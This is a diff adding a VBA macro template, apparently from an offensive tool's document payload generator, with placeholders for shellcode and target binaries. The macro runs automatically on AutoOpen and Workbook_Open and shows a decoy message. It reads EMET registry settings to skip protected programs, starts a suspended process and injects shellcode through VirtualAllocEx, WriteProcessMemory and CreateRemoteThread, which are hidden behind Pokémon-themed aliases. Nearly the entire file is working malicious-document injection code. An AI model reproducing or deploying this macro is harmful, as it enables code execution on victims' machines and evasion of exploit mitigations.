@@ -1,0 +1,351 @@
+Private Const PROCESS_ALL_ACCESS = &H1F0FFF
+Private Const MEM_COMMIT = &H1000
+Private Const MEM_RELEASE = &H8000
+Private Const PAGE_READWRITE = &H40
+Private Const HKEY_LOCAL_MACHINE = &H80000002
+Private Const PROCESSOR_ARCHITECTURE_AMD64 = 9
+Private Type PROCESS_INFORMATION
+hProcess As Long
+hThread As Long
+dwProcessId As Long
+dwThreadId As Long
+End Type
+Private Type STARTUPINFO
+cb As Long
+lpReserved As String
+lpDesktop As String
+lpTitle As String
+dwX As Long
+dwY As Long
+dwXSize As Long
+dwYSize As Long
+dwXCountChars As Long
+dwYCountChars As Long
+dwFillAttribute As Long
+dwFlags As Long
+wShowWindow As Integer
+cbReserved2 As Integer
+lpReserved2 As Long
+hStdInput As Long
+hStdOutput As Long
+hStdError As Long
+End Type
+#If VBA7 Then 'x64 office
+Private Declare PtrSafe Function bodyslam Lib "kernel32" Alias "TerminateProcess" (ByVal hProcess As Long, ByVal uExitCode As Long) As Boolean
+Private Declare PtrSafe Function watergun Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+Private Declare PtrSafe Function leechseed Lib "kernel32" Alias "VirtualFreeEx" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal dwFreeType As Long) As LongPtr
+Private Declare PtrSafe Function thunderbolt Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lpBaseAddress As LongPtr, ByRef lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As LongPtr) As LongPtr
+Private Declare PtrSafe Function flamethrower Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Any, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Any, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
+Private Declare PtrSafe Sub pokedex Lib "kernel32" Alias "GetSystemInfo" (lpSystemInfo As SYSTEM_INFO)
+Private Declare PtrSafe Function cosmicpower Lib "kernel32" Alias "GetCurrentProcess" () As LongPtr
+Private Declare PtrSafe Function rarecandy Lib "kernel32" Alias "IsWow64Process" (ByVal hProcess As LongPtr, ByRef Wow64Process As Boolean) As Boolean
+Private Declare PtrSafe Function dragonascent Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, ByVal lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
+Private Type SYSTEM_INFO
+wProcessorArchitecture As Integer
+wReserved As Integer
+dwPageSize As Long
+lpMinimumApplicationAddress As LongPtr
+lpMaximumApplicationAddress As LongPtr
+dwActiveProcessorMask As LongPtr
+dwNumberOrfProcessors As Long
+dwProcessorType As Long
+dwAllocationGranularity As Long
+wProcessorLevel As Integer
+wProcessorRevision As Integer
+End Type
+#Else
+Private Declare Function bodyslam Lib "kernel32" Alias "TerminateProcess" (ByVal hProcess As Long, ByVal uExitCode As Long) As Boolean
+Private Declare Function watergun Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddress As Any, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
+Private Declare Function leechseed Lib "kernel32" Alias "VirtualFreeEx" (ByVal hProcess As Long, ByVal lpAddress As Any, ByVal dwSize As Long, ByVal dwFreeType As Long) As Long
+Private Declare Function thunderbolt Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lpBaseAddress As Any, ByRef lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
+Private Declare Function flamethrower Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Any, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Any, ByVal dwCreationFlags As Long, lpThreadId As Long) As Long
+Private Declare Sub pokedex Lib "kernel32" Alias "GetSystemInfo" (lpSystemInfo As SYSTEM_INFO)
+Private Declare Function cosmicpower Lib "kernel32" Alias "GetCurrentProcess" () As Long
+Private Declare Function rarecandy Lib "kernel32" Alias "IsWow64Process" (ByVal hProcess As Long, ByRef Wow64Process As Boolean) As Boolean
+Private Declare Function dragonascent Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
+Private Type SYSTEM_INFO
+wProcessorArchitecture As Integer
+wReserved As Integer
+dwPageSize As Long
+lpMinimumApplicationAddress As Long
+lpMaximumApplicationAddress As Long
+dwActiveProcessorMask As Long
+dwNumberOrfProcessors As Long
+dwProcessorType As Long
+dwAllocationGranularity As Long
+dwReserved As Long
+End Type
+#End If
+Dim inject64 As Boolean
+Public Function IsOffice64Bit() As Boolean
+Dim lpSystemInfo As SYSTEM_INFO
+Call pokedex(lpSystemInfo)
+If lpSystemInfo.wProcessorArchitecture = PROCESSOR_ARCHITECTURE_AMD64 Then
+Call rarecandy(cosmicpower(), IsOffice64Bit)
+IsOffice64Bit = Not IsOffice64Bit
+End If
+End Function
+Public Function IsWow64(handle As Long) As Boolean
+Call rarecandy(handle, meh)
+IsWow64 = Not meh
+End Function
+Public Function DieTotal()
+{{ MSGBOX }}
+End Function
+Public Function TrailingSlash(strFolder As String) As String
+If Len(strFolder) > 0 Then
+If Right(strFolder, 1) = "\" Then
+TrailingSlash = strFolder
+Else
+TrailingSlash = strFolder & "\"
+End If
+End If
+End Function
+Public Function RecursiveDir(colFiles As Collection, strFolder As String, strFileSpec As String, bIncludeSubfolders As Boolean)
+Dim strTemp As String
+Dim colFolders As New Collection
+Dim vFolderName As Variant
+strFolder = TrailingSlash(strFolder)
+On Error Resume Next
+strTemp = Dir(strFolder & strFileSpec)
+Do While strTemp <> vbNullString
+colFiles.Add strFolder & strTemp
+strTemp = Dir
+Loop
+If bIncludeSubfolders Then
+strTemp = Dir(strFolder, vbDirectory)
+Do While strTemp <> vbNullString
+If (strTemp <> ".") And (strTemp <> "..") Then
+If (GetAttr(strFolder & strTemp) And vbDirectory) <> 0 Then
+colFolders.Add strTemp
+End If
+End If
+strTemp = Dir
+Loop
+For Each vFolderName In colFolders
+Call RecursiveDir(colFiles, strFolder & vFolderName, strFileSpec, True)
+Next vFolderName
+End If
+End Function
+Public Function getList() As String()
+Dim myList As String
+myList = ""
+{{ BIN_PATHS }}
+myArray = Split(myList, ",")
+Dim c As Integer
+Dim list() As String
+For c = LBound(myArray) To (UBound(myArray) - 1)
+ReDim Preserve list(c)
+list(c) = myArray(c)
+Next
+c = UBound(list)
+Dim colFiles As New Collection
+{{ DIR_PATHS }}
+Dim vFile As Variant
+For Each vFile In colFiles
+ReDim Preserve list(c)
+list(c) = vFile
+c = c + 1
+Next vFile
+getList = list
+End Function
+Public Function pathOf(program As String) As String
+pathOf = ""
+If program Like "*.exe" Then
+program = program
+Else
+program = program & ".exe"
+End If
+If program Like "*:\*" Then
+pathOf = program
+Exit Function
+Else
+paths = Environ("PATH")
+Dim allPaths() As String
+allPaths = Split(paths, ";")
+Dim Path As Variant
+For Each Path In allPaths
+ms = Path & "\" & program
+If Not Dir(ms, vbDirectory) = vbNullString Then
+pathOf = ms
+Exit Function
+End If
+Next
+End If
+End Function
+Public Function getEMET() As String()
+Set objShell = CreateObject("WScript.Shell")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & "." & "\root\default:StdRegProv")
+oReg.EnumValues HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\EMET\AppSettings", arrValues, arrTypes
+Dim smack() As String
+Dim count As Integer
+If IsArray(arrValues) Then
+    For count = LBound(arrValues) To UBound(arrValues)
+    ReDim Preserve smack(count)
+    smack(count) = arrValues(count)
+    Next
+Else
+    ReDim Preserve smack(0)
+    smack(0) = ""
+End If
+getEMET = smack
+End Function
+Public Function AutoPwn() As Long
+myArray = FightEMET
+Dim Count As Integer
+Dim Success As Integer
+For Count = LBound(myArray) To UBound(myArray)
+Dim proc As String
+proc = myArray(Count)
+Success = Inject(proc)
+If Success = 1 Then Exit For
+Next
+End Function
+Public Function FightEMET() As String()
+myArray = getList
+smex = getEMET
+Dim count As Integer
+Dim sCount As Integer
+Dim kCount As Integer
+kCount = 0
+Dim killedEMET() As String
+For count = LBound(myArray) To UBound(myArray)
+progo = myArray(count)
+prog = Split(progo, ".exe")
+kk = Replace(prog(0), "\\", "\")
+Dim gg As String
+gg = kk
+pathKK = Replace(pathOf(Replace(gg, """", "")), "\\", "\")
+Dim fudgeBool As Boolean
+fudgeBool = False
+    If Not smex(0) = "" Then
+        For sCount = LBound(smex) To UBound(smex)
+            If LCase(pathKK) Like LCase(smex(sCount)) Then
+                fudgeBool = True
+            End If
+        Next
+    End If
+    If fudgeBool = False Then
+            ReDim Preserve killedEMET(kCount)
+            killedEMET(kCount) = myArray(count)
+            kCount = kCount + 1
+    End If
+Next
+FightEMET = killedEMET
+End Function
+Public Function Inject(processCmd As String) As Long
+Dim myByte As Long, buf As Variant, myCount As Long, hProcess As Long
+#If VBA7 Then
+    Dim lLinkToLibary As LongPtr, rekt As LongPtr, hThread As LongPtr
+#Else
+    Dim lLinkToLibary As Long, rekt As Long, hThread As Long
+#End If
+Dim pInfo As PROCESS_INFORMATION
+Dim sInfo As STARTUPINFO
+Dim sNull As String
+Dim sProc As String
+sInfo.dwFlags = 1
+If IsOffice64Bit Then
+On Error Resume Next
+sProc = processCmd
+res = dragonascent(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)
+hProcess = pInfo.hProcess
+Dim b64 As Boolean
+b64 = False
+b64 = IsWow64(hProcess)
+inject64 = {{ INJECT_64 }}
+If b64 = True Then
+If inject64 = True Then
+If hProcess = 0 Then
+Exit Function
+End If
+lLinkToLibrary = watergun(hProcess, 0&, &H{{ PAYLOAD_64_LEN }}, &H3000, PAGE_READWRITE)
+If lLinkToLibrary = 0 Then
+sly = bodyslam(hProcess, lol)
+Exit Function
+End If      
+Position = lLinkToLibrary
+{{ PAYLOAD_64 }}
+For myCount = LBound(buf) To UBound(buf)
+myByte = buf(myCount)
+rekt = thunderbolt(hProcess, ByVal (lLinkToLibrary + myCount), myByte, 1, b)
+Next myCount
+hThread = flamethrower(hProcess, 0&, 0&, ByVal lLinkToLibrary, 0, 0, ByVal 0&)
+End If
+If hThread = 0 or Inject64 = False Then
+If lLinkToLibrary <> 0 Then
+leechseed hProcess, lLinkToLibrary, 0, MEM_RELEASE
+End If
+hProcess = pInfo.hProcess
+sly = bodyslam(hProcess, lol)
+Exit Function
+Else
+Inject = 1 'Success
+End If
+Else
+If hProcess = 0 Then
+Exit Function
+End If
+lLinkToLibrary = watergun(hProcess, 0&, &H{{ PAYLOAD_86_LEN }}, &H3000, PAGE_READWRITE)
+If lLinkToLibrary = 0 Then
+sly = bodyslam(hProcess, lol)
+Exit Function
+End If
+Position = lLinkToLibrary
+{{ PAYLOAD_86 }}
+For myCount = LBound(buf) To UBound(buf)
+myByte = buf(myCount)
+rekt = thunderbolt(hProcess, ByVal (lLinkToLibrary + myCount), myByte, 1, b)
+Next myCount
+hThread = flamethrower(hProcess, 0&, 0&, ByVal lLinkToLibrary, 0, 0, ByVal 0&)
+If hThread = 0 Then
+If lLinkToLibrary <> 0 Then
+leechseed hProcess, lLinkToLibrary, 0, MEM_RELEASE
+End If
+hProcess = pInfo.hProcess
+sly = bodyslam(hProcess, lol)
+Exit Function
+Else
+Inject = 1 'Success
+End If
+End If
+Else
+sProc = processCmd
+res = dragonascent(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)
+hProcess = pInfo.hProcess
+If hProcess = 0 Then
+Exit Function
+End If
+lLinkToLibrary = watergun(hProcess, 0&, &H{{ PAYLOAD_86_LEN }}, &H3000, PAGE_READWRITE)
+If lLinkToLibrary = 0 Then
+sly = bodyslam(hProcess, lol)
+Exit Function
+End If         
+Position = lLinkToLibrary
+{{ PAYLOAD_86 }}
+For myCount = LBound(buf) To UBound(buf)
+myByte = buf(myCount)
+rekt = thunderbolt(hProcess, ByVal (lLinkToLibrary + myCount), myByte, 1, b)
+Next myCount
+hThread = flamethrower(hProcess, 0&, 0&, ByVal lLinkToLibrary, 0, 0, ByVal 0&)
+If hThread = 0 Then
+If lLinkToLibrary <> 0 Then
+leechseed hProcess, lLinkToLibrary, 0, MEM_RELEASE
+End If
+hProcess = pInfo.hProcess
+sly = bodyslam(hProcess, lol)
+Exit Function
+Else
+Inject = 1 'Success
+End If
+End If
+End Function
+Sub AutoOpen()
+DieTotal
+AutoPwn
+End Sub
+Sub Workbook_Open()
+DieTotal
+AutoPwn
+End Sub
